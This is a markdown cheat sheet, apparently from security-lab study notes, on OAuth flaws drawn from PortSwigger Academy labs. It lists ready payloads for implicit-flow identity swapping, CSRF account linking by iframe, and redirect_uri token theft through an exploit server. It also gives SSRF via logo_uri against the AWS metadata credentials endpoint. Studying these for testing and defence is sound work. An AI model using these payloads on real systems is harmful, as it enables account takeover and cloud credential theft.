# OAuth authentication — topic overview & router

OAuth 2.0 delegates authorization to a third-party provider (social login). The client app receives user data or tokens and then authenticates the user. Key flaw classes: (1) implicit flow with no server-side token validation — user-controlled email field bypasses identity; (2) missing `state` parameter on account-linking → CSRF links attacker's social account to victim; (3) `redirect_uri` not validated → code/token leaked to attacker; (4) path traversal in whitelisted `redirect_uri` chains with open redirects to steal tokens; (5) OpenID dynamic client registration with attacker-controlled `logo_uri` → SSRF on OAuth server.

## 30-second quick reference

```
# Implicit flow — swap identity
POST /authenticate
{"email":"carlos@carlos-montoya.net","username":"carlos","token":"<ANY-VALID-TOKEN>"}

# CSRF account linking (no state param)
<iframe src="https://LAB/oauth-linking?code=STOLEN-CODE"></iframe>

# redirect_uri open — code theft
GET /auth?client_id=X&redirect_uri=https://EXPLOIT-SERVER&response_type=code&scope=openid profile email
# → code in exploit server access log → /oauth-callback?code=STOLEN → logged in as victim

# redirect_uri path traversal → open redirect → token theft
redirect_uri=https://LAB/oauth-callback/../post/next?path=https://EXPLOIT-SERVER/exploit
response_type=token
# Exploit server: window.location = '/?'+document.location.hash.substr(1)

# OpenID dynamic registration SSRF
POST /reg {"redirect_uris":["https://x.com"],"logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}
GET /client/CLIENT-ID/logo  → AWS metadata in response
```

## Decision map

| Observation | Sub-technique | Attack |
|---|---|---|
| POST /authenticate with user email/token in body | [Implicit-flow-and-open-redirect](Implicit-flow-and-open-redirect/) | swap email to victim |
| OAuth flow has no state param | [Account-linking-and-CSRF](Account-linking-and-CSRF/) | CSRF to link attacker account |
| redirect_uri accepts arbitrary domains | [Account-linking-and-CSRF](Account-linking-and-CSRF/) | set redirect_uri to exploit server |
| redirect_uri validates domain but not path | [Implicit-flow-and-open-redirect](Implicit-flow-and-open-redirect/) | path traversal + open redirect → token |
| /post/comment/comment-form postMessage(*) | [Implicit-flow-and-open-redirect](Implicit-flow-and-open-redirect/) | proxy page → steal token fragment |
| OpenID /.well-known/openid-configuration | [OpenID-and-SSRF](OpenID-and-SSRF/) | dynamic client reg → SSRF via logo_uri |

## Sub-technique folders
- `Implicit-flow-and-open-redirect/` — implicit flow identity bypass, path-traversal + open-redirect token theft, proxy-page token theft (Labs 1, 4, 5)
- `Account-linking-and-CSRF/` — CSRF account linking via missing state, redirect_uri code theft (Labs 2, 3)
- `OpenID-and-SSRF/` — OpenID dynamic client registration SSRF via logo_uri (Lab 6)

## Root cause
- Implicit flow: server trusts client-supplied user identity (email) without verifying it matches the token's subject. Attacker replays a valid token with a different email.
- Missing `state`: no CSRF protection on account-linking → attacker pre-generates auth code, delivers to victim, victim's click binds attacker's social profile to victim's account.
- `redirect_uri` validation: whitelisting only domain (not full path) allows path traversal + open redirect to route code/token to attacker server.
- Dynamic client registration: OAuth server fetches `logo_uri` server-side → SSRF to internal metadata endpoints.

## Find it
1. Proxy the full OAuth flow: observe what data is POSTed to `/authenticate` or `/oauth-callback`.
2. Check if `/authenticate` or `/oauth-linking` contains email/username — try swapping.
3. Check OAuth authorization request for `state` parameter. Absent = CSRF account linking possible.
4. Test `redirect_uri`: add extra characters, path segments, `/../` — does it error or accept?
5. Check `/post/next?path=` or similar — open redirect usable with token `response_type`.
6. Browse `/.well-known/openid-configuration` for `registration_endpoint`.

## Chaining
- Implicit flow → account takeover → [Access-control](../Access-control/) (admin delete)
- CSRF account linking → admin panel access → [CSRF](../CSRF/)
- redirect_uri open → code/token theft → account takeover → [Authentication](../Authentication/)
- SSRF via logo_uri → cloud metadata → credential leak → external impact

## Tools
- **Burp Proxy** — capture full OAuth flow, intercept auth code before redirect
- **Burp Repeater** — replay POST /authenticate with swapped email
- **Exploit server** — receive stolen codes/tokens via redirect; host iframe payloads
- **Burp Collaborator** — confirm SSRF on logo_uri fetch

## References
- https://portswigger.net/web-security/oauth
- https://portswigger.net/web-security/oauth/grant-types
- https://portswigger.net/web-security/oauth/openid
